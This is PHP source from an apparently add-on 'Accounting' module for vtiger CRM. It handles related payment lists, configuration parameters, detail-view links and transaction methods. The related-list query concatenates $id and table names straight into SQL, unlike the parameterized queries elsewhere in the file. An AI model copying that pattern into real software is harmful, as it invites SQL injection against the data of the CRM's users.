		if ($module == "Invoice") {
			$rel_tabla = "vtiger_invoice";
			$rel_id = "invoiceid";
			$acc_rel_field = "accountingrelated2";

		} else if ($module == "SalesOrder") {
			$rel_tabla = "vtiger_salesorder";
			$rel_id = "salesorderid";
			$acc_rel_field = "accountingrelated2";

		} else if ($module == "PurchaseOrder") {
			$rel_tabla = "vtiger_purchaseorder";
			$rel_id = "purchaseorderid";
			$acc_rel_field = "accountingrelated2";

		} else if ($module == "Accounts") {
			$rel_tabla = "vtiger_account";
			$rel_id = "accountid";
			$acc_rel_field = "accountingrelated1";

		} else if ($module == "Contacts") {
			$rel_tabla = "vtiger_contactdetails";
			$rel_id = "contactid";
			$acc_rel_field = "accountingrelated1";

		} else if ($module == "Vendors") {
			$rel_tabla = "vtiger_vendor";
			$rel_id = "vendorid";
			$acc_rel_field = "accountingrelated1";
		}  else if ($module == "Project") {
			$rel_tabla = "vtiger_project";
			$rel_id = "projectid";
			$acc_rel_field = "accountingrelated1";
		} else if ($module == "Potentials") {
			$rel_tabla = "vtiger_potential";
			$rel_id = "potentialid";
			$acc_rel_field = "accountingrelated1";
		}
		$query = "SELECT vtiger_accounting.*,
				vtiger_crmentity.crmid,
	                        vtiger_crmentity.smownerid,
				vtiger_accounting.paymentref,
				case when (vtiger_users.user_name not like '') then vtiger_users.user_name else vtiger_groups.groupname end as user_name
				FROM vtiger_accounting
				INNER JOIN vtiger_crmentity
					ON vtiger_crmentity.crmid = vtiger_accounting.accountingid
				LEFT JOIN ".$rel_tabla."
					ON ".$rel_tabla.".".$rel_id." = vtiger_accounting.accountingid
				LEFT JOIN vtiger_groups
					ON vtiger_groups.groupid = vtiger_crmentity.smownerid
				LEFT JOIN vtiger_users
					ON vtiger_crmentity.smownerid = vtiger_users.id
				WHERE vtiger_crmentity.deleted = 0
				AND vtiger_accounting.".$acc_rel_field." = ".$id;

		$return_value = GetRelatedList($this_module, $related_module, $other, $query, $button, $returnset);

		if (($module == "Invoice" || $module == "PurchaseOrder" || $module == "SalesOrder") && count($return_value['entries']) > 0) {
			$button = "";
		}

		if($return_value == null) $return_value = Array();
		$return_value['CUSTOM_BUTTON'] = $button;

		$log->debug("Exiting get_contacts method ...");
		return $return_value;
	}

	static function loadConfigParams()
	{
		global $adb;
		$querystr = "select * from vtiger_accountingconfig";

		$res=$adb->pquery($querystr, array());
		$numrows = $adb->num_rows($res);

		for($i = 0; $i < $numrows; $i++)
		{
			$param = $adb->query_result($res, $i, "param");
			$value = $adb->query_result($res, $i, "value");
			$params[$param] = $value;
		}

		return $params;
	}

	static function updateCustomLinks($modules, $addLink)
	{
		global $adb, $mod_strings, $currentModule, $vtiger_current_version;

		if ($currentModule == 'Accounting')
			$mod_strings_aux = $mod_strings;
		else
			$mod_strings_aux = return_module_language($_SESSION["authenticated_user_language"], 'Accounting');

		$label = "Add New Payment";

		$adb->pquery('DELETE FROM vtiger_links WHERE linktype=? AND linkurl=?',
					array('DETAILVIEWBASIC', 'index.php?module=Accounting&action=EditView&return_module=$MODULE$&return_action=DetailView&return_id=$RECORD$&parent_id=$RECORD$&detalislink=true'));
		$adb->pquery('DELETE FROM vtiger_links WHERE linktype=? AND linkurl=?',
					array('DETAILVIEWBASIC', 'index.php?module=Accounting&action=EditView&return_module=$MODULE$&return_action=DetailView&return_id=$RECORD$&parent_id=$RECORD$&detailslink=true'));

		if ($addLink == "true") {
			include_once('vtlib/Vtiger/Module.php');
			foreach($modules as $mod) {
				$module = Vtiger_Module::getInstance($mod);
				Vtiger_Link::addLink($module->id, 'DETAILVIEWBASIC', $label/*$mod_strings_aux['LBL_ADD_PAYMENT']*/,
					'index.php?module=Accounting&action=EditView&return_module=$MODULE$&return_action=DetailView&return_id=$RECORD$&parent_id=$RECORD$&detailslink=true');
			}
		}
	}


	static function updateTransactionMethods($methods) {
		global $adb;

		if ($methods == "") {
			return;
		}

		$methods = trim($methods, "###$$###");
		$methods = explode("###$$###", $methods);

		$q = "DELETE FROM vtiger_accountingtransmethods";
		$adb->pquery($q, array());

		foreach($methods as $method) {
			$q = "INSERT INTO vtiger_accountingtransmethods (method) VALUES(?);";
			$adb->pquery($q, array($method));
		}

	}
	static function updateConfigParam($param, $value)
	{
		global $adb;

		$q = "INSERT INTO vtiger_accountingconfig (param, value) VALUES (?, ?)";
		$res=$adb->pquery($q, array($param, $value));

		$q = "UPDATE vtiger_accountingconfig SET value=? WHERE param=?";
		$res=$adb->pquery($q, array($value, $param));
	}

	static function _unsetRelatedList($moduleInstance) {
		global $adb;

		if(empty($moduleInstance)) return;

		$adb->pquery("DELETE FROM vtiger_relatedlists WHERE related_tabid=?",
			Array($moduleInstance->id));
	}

	static function _checkModuleActive($module){
		global $adb;

		$isactive = false;

		$q = "SELECT name FROM vtiger_tab WHERE presence=0";
		$res = $adb->pquery($q, array());
		$numrows = $adb->num_rows($res);

		for($i = 0; $i < $numrows; $i++) {
			$name = $adb->query_result($res, $i, "name");
			if(strcmp($module,$name) == 0){
				$isactive = true;
				break;
			}
		}

		return $isactive;
	}
	static function setRelatedModules($status) {
		global $mod_strings;

		include_once('vtlib/Vtiger/Module.php');

		$mod_arr = array('Invoice', 'SalesOrder', 'PurchaseOrder', 'Accounts', 'Contacts', 'Vendors', 'Project', 'Potentials');

		if ($status == 'true') {
			foreach($mod_arr as $module) {
				$status = Accounting::_checkModuleActive($module);
				if($status == true) {
					$module = Vtiger_Module::getInstance($module);
					$module->setRelatedList(Vtiger_Module::getInstance('Accounting'), $mod_strings['LBL_PAYMENTS_INFO'], Array('ADD'), 'get_dependents_list');
				}
			}
		} else {
			Accounting::_unsetRelatedList(Vtiger_Module::getInstance('Accounting'));
		}
	}

	static function get_transaction_methods($addNone = true) {
		global $adb, $app_strings;
		$querystr = "select * from vtiger_accountingtransmethods";

		$res=$adb->pquery($querystr, array());
		$numrows = $adb->num_rows($res);
		$params = array();

		if ($addNone == true) {
			array_push($params, '---');
		}

		for($i = 0; $i < $numrows; $i++)
		{
		//	$param = $adb->query_result($res, $i, "idmethod");
			$value = $adb->query_result($res, $i, "method");
			//$params[$param] = $value;
			array_push($params, $value);
		}

		return $params;
	}
}


?>